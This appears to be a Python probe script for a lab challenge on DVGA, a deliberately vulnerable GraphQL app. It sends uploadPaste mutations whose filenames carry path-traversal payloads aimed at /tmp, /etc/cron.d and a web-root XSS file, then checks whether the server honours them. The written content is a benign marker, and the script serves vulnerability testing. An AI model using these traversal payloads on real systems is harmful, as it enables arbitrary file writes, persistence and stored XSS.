#!/usr/bin/env python3
"""
dvga_challenge_08_path_traversal.py — Path traversal / arbitrary file write via
uploadPaste(filename:).

DVGA's `uploadPaste(content, filename)` writes `content` to a file whose name
is attacker-controlled, with no sanitisation. `../` sequences let the write
escape the intended upload directory (e.g. drop an HTML/JS file into the web
root for stored XSS, or overwrite config files).

RELIABLE signal: the mutation returns `result` that reflects the (traversing)
filename, proving the server used our path verbatim. We use a harmless marker
filename and a benign content, and report the reflected path.
Run: python3 dvga_challenge_08_path_traversal.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="Path traversal via uploadPaste(filename:)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(808)

    filenames = [
        "normal.txt",
        "../../tmp/dvga_traversal.txt",
        "..%2f..%2f..%2fetc/cron.d/dvga",
        "web/../../var/www/html/xss.html",
    ]

    hits = 0
    for fn in filenames:
        q = (
            "mutation { uploadPaste(content: \"dvga-traversal-probe\", filename: \"%s\") { result } }"
            % fn
        )
        r = dv.graphql(base, q, None, cfg, hdrs, tout)
        if r is None:
            print(f"uploadPaste(filename={fn!r}) -> transport error")
            continue
        body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
        errs = body.get("errors") or []
        result = (((body.get("data") or {}).get("uploadPaste") or {}).get("result"))
        blob = str(result) or ""
        # A traversal signal is the reflected path containing '../' or an
        # absolute path outside the upload dir.
        traversed = (".." in fn and (".." in blob) ) or ("/etc/" in blob) or ("/var/" in blob) or ("/tmp/" in blob)
        if traversed:
            hits += 1
        print(f"uploadPaste(filename={fn!r}) -> "
              f"{'[SIGNAL: traversal path reflected/used]' if traversed else 'sanitised/refused'} | result={blob[:120]!r}")

    print(f"\nDone — {hits}/{len(filenames)} filename(s) produced a path-traversal signal.")
    if hits:
        print("[FINDING] uploadPaste(filename:) honours '../' sequences — arbitrary file write / path traversal.")
    else:
        print("[ok] traversal filenames were sanitised or rejected on this build.")


if __name__ == "__main__":
    main()
